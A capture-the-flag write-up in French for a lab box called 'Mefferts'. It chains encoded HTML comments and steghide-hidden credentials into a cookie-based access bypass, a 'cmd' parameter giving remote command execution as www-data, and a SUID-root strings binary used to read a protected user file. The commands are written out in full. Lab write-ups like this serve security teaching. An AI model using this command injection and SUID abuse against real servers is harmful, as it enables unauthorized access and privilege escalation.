#Mefferts

## Flag

```text
EPI{********}
```

> **Note:** Le flag obtenu pendant le challenge est : `EPI{********}`

---

## 1. Objectif

L'objectif de ce challenge était de compromettre la machine cible afin de récupérer le flag.

La méthodologie suivie a été progressive :

1. Énumération des services réseau.
2. Analyse du service HTTP.
3. Recherche d'informations cachées dans le code source.
4. Décodage de données encodées.
5. Exploitation de stéganographie.
6. Récupération d'identifiants.
7. Contournement de l'authentification.
8. Exploitation d'une Remote Code Execution (RCE).
9. Énumération des privilèges et binaires SUID.
10. Utilisation d'un binaire `strings` SUID root pour lire le fichier `user.txt`.

---

## 2. Techniques utilisées

* Network enumeration
* Service enumeration
* Web enumeration
* Source code analysis
* OSINT
* Base64 decoding
* Base32 decoding
* Hexadecimal decoding
* Steganography
* Authentication bypass
* Command injection / Remote Code Execution
* Local privilege enumeration
* SUID enumeration
* Exploitation of a SUID binary
* Linux permission bypass through a SUID process

---

## 3. Outils utilisés

* `nmap`
* `curl`
* Navigateur web
* `base64`
* `base32`
* `xxd`
* `steghide`
* `find`
* `strings`

---

# 4. Reconnaissance réseau

La première étape consiste à effectuer un scan des ports de la machine cible avec Nmap.

```bash
nmap -sC -sV -p- <TARGET_IP>
```

L'énumération révèle une configuration inhabituelle : les services utilisent des ports qui ne correspondent pas à leurs ports standards.

Le résultat important est que :

* le service HTTP est disponible sur le **port 22** ;
* le service SSH est disponible sur le **port 80**.

Cette inversion constitue un premier indice du challenge.

### Ports identifiés

| Port | Service réel |
| ---- | ------------ |
| 22   | HTTP         |
| 80   | SSH          |

Il est donc nécessaire de ne pas se fier uniquement aux numéros de ports et d'identifier les services réellement exécutés.

---

# 5. Énumération Web

Le service HTTP est accessible sur le port 22.

```bash
curl -i http://<TARGET_IP>:22/
```

Le site découvert est **HK Now Store**, un site permettant notamment de vendre des Rubik's Cubes.

Le thème du site constitue un indice important : le challenge tourne autour des **puzzles/cubes**.

Une analyse du code source HTML est ensuite effectuée afin de rechercher des informations qui ne sont pas directement visibles sur la page.

---

# 6. Analyse du code source

En inspectant le code source de la page, un commentaire HTML caché est découvert.

Le contenu du commentaire est encodé en **Base64**.

Le contenu peut être décodé avec :

```bash
echo '<BASE64_DATA>' | base64 -d
```

Le décodage permet de récupérer un mot de passe de secours :

```text
5Uch_4_G3n1u5_cR34ToR
```

Ce mot de passe sera utilisé plus tard pour l'analyse d'une image.

---

# 7. Découverte de `/recovery.php`

Une nouvelle ressource intéressante est identifiée :

```text
/recovery.php
```

La page contient un formulaire de connexion ainsi qu'un indice faisant référence à **Uwe**.

L'analyse du code source de cette page permet également de découvrir un commentaire contenant des données encodées.

Plusieurs niveaux de décodage sont nécessaires :

```text
Base64 → Base32 → Hexadecimal
```

Le processus peut être réalisé avec les outils Linux correspondants.

### Base64

```bash
echo '<DATA>' | base64 -d
```

### Base32

```bash
echo '<DATA>' | base32 -d
```

### Hexadecimal

```bash
echo '<DATA>' | xxd -r -p
```

Le message obtenu donne l'indice suivant :

```text
les cubes sont la clé de tout
```

Cet indice oriente vers l'analyse des images présentes sur le site.

---

# 8. Stéganographie

Les différentes images disponibles sur le site sont récupérées afin de rechercher des données cachées.

L'outil `steghide` est utilisé pour identifier les données dissimulées dans les fichiers JPEG.

```bash
steghide info cube_gold.jpg
```

Une particularité est remarquée : `cube_gold.jpg` est la seule image ne présentant pas les métadonnées GIMP attendues sur les autres images.

Cette image devient donc particulièrement intéressante.

Le mot de passe précédemment récupéré est utilisé pour extraire les données cachées :

```bash
steghide extract -sf cube_gold.jpg -p '5Uch_4_G3n1u5_cR34ToR'
```

Les données extraites contiennent des identifiants :

```text
Username: uweThePuzzleMaster
Password: ********
```

Ces identifiants constituent une nouvelle piste d'accès à l'application.

---

# 9. Authentification

Les identifiants récupérés sont utilisés sur :

```text
/recovery.php
```

Après authentification, un cookie particulier est observé :

```text
login=uwe:thisisnotevennecessary
```

Ce cookie permet d'accéder à une ressource qui n'est normalement pas accessible directement :

```text
/my_very_secret_dir/index.php
```

L'authentification peut donc être contournée/manipulée grâce au cookie.

---

# 10. Remote Code Execution

L'analyse de la page protégée révèle la présence d'un paramètre `cmd`.

Les commandes envoyées dans ce paramètre sont exécutées directement par le serveur.

Par exemple :

```bash
curl 'http://<TARGET_IP>:22/my_very_secret_dir/index.php?cmd=id'
```

Le serveur retourne un résultat indiquant que les commandes sont exécutées avec les privilèges de :

```text
www-data
```

Il s'agit donc d'une **Remote Code Execution (RCE)**.

Le paramètre `cmd` n'effectue pas de filtrage suffisant des commandes utilisateur.

---

# 11. Énumération locale

Une fois la RCE obtenue, l'environnement Linux peut être énuméré.

L'objectif est notamment de rechercher les fichiers exécutables disposant du bit **SUID**.

La commande utilisée est :

```bash
find / -perm -4000 -type f 2>/dev/null
```

Un résultat particulièrement intéressant est découvert :

```text
/usr/bin/strings
```

Le binaire `strings` possède le bit SUID et est exécuté avec les privilèges de `root`.

---

# 12. Exploitation du binaire SUID

Le comportement du programme est analysé.

Un fichier normalement inaccessible à `www-data` est présent dans :

```text
/home/uwe/user.txt
```

Le répertoire personnel d'Uwe possède des permissions restrictives, empêchant normalement `www-data` d'accéder directement au fichier.

Cependant, le binaire `strings` est SUID root.

Lorsqu'il est exécuté, son **effective UID (EUID)** est `root`.

Il peut donc effectuer des opérations de lecture avec les privilèges de `root`, contournant ainsi les restrictions classiques du système de fichiers.

La commande permet de récupérer le contenu de `user.txt` :

```bash
/usr/bin/strings /home/uwe/user.txt
```

Le flag utilisateur est ainsi récupéré.

---

# 13. Chaîne d'exploitation

La chaîne complète de compromission est la suivante :

```text
Nmap
  │
  ├── Port 22 → HTTP
  └── Port 80 → SSH
        │
        ▼
    HK Now Store
        │
        ▼
    Source HTML
        │
        ▼
    Base64
        │
        ▼
    Mot de passe de secours
        │
        ▼
    /recovery.php
        │
        ▼
    Base64 → Base32 → Hex
        │
        ▼
    "les cubes sont la clé de tout"
        │
        ▼
    cube_gold.jpg
        │
        ▼
    Steghide
        │
        ▼
    Identifiants Uwe
        │
        ▼
    /recovery.php
        │
        ▼
    Cookie login
        │
        ▼
    /my_very_secret_dir/
        │
        ▼
    ?cmd=
        │
        ▼
    RCE as www-data
        │
        ▼
    SUID enumeration
        │
        ▼
    /usr/bin/strings
        │
        ▼
    EUID root
        │
        ▼
    /home/uwe/user.txt
        │
        ▼
    FLAG
```

---

# 14. Vulnérabilités identifiées

## 14.1 Informations sensibles dans le code source

Des informations permettant de poursuivre l'exploitation sont présentes dans des commentaires HTML accessibles côté client.

**Impact :** fuite d'informations sensibles.

---

## 14.2 Données secrètes cachées dans une image

Des informations permettant de récupérer des identifiants sont dissimulées dans une image avec `steghide`.

**Impact :** fuite d'identifiants.

---

## 14.3 Authentification basée sur un cookie manipulable

Le mécanisme d'authentification repose sur un cookie pouvant être utilisé pour accéder au répertoire secret.

**Impact :** contournement du contrôle d'accès.

---

## 14.4 Remote Code Execution

Le paramètre :

```text
?cmd=
```

permet l'exécution directe de commandes système sans filtrage approprié.

**Impact :** compromission complète du serveur applicatif avec les privilèges de l'utilisateur exécutant le serveur web.

---

## 14.5 Binaire SUID dangereux

Le binaire :

```text
/usr/bin/strings
```

est configuré avec le bit SUID root.

Cela permet à un utilisateur non privilégié d'utiliser le programme avec les privilèges de `root`.

**Impact :** élévation potentielle de privilèges et accès à des fichiers protégés.

---

# 15. Flag final

Le flag récupéré au cours du challenge est :

```text
EPI{********}
```

---

# 16. Conclusion

Ce challenge repose sur une chaîne d'exploitation composée de plusieurs petites découvertes plutôt que sur une seule vulnérabilité.

L'énumération initiale permet de remarquer l'inversion des services HTTP/SSH. L'analyse du site révèle ensuite plusieurs indices cachés dans le code source. Les différents encodages conduisent à un mot de passe qui permet d'exploiter une image contenant des identifiants dissimulés avec `steghide`.

Ces identifiants permettent ensuite d'atteindre une zone protégée et de découvrir une RCE via le paramètre `cmd`. Enfin, l'énumération des binaires SUID révèle que `strings` dispose des privilèges `root`, ce qui permet de lire un fichier normalement inaccessible et de récupérer le flag.

La chaîne principale peut donc être résumée par :

```text
Enumeration
→ Information Disclosure
→ Encoding
→ Steganography
→ Authentication Bypass
→ RCE
→ SUID Enumeration
→ Privilege Escalation
→ Flag
```
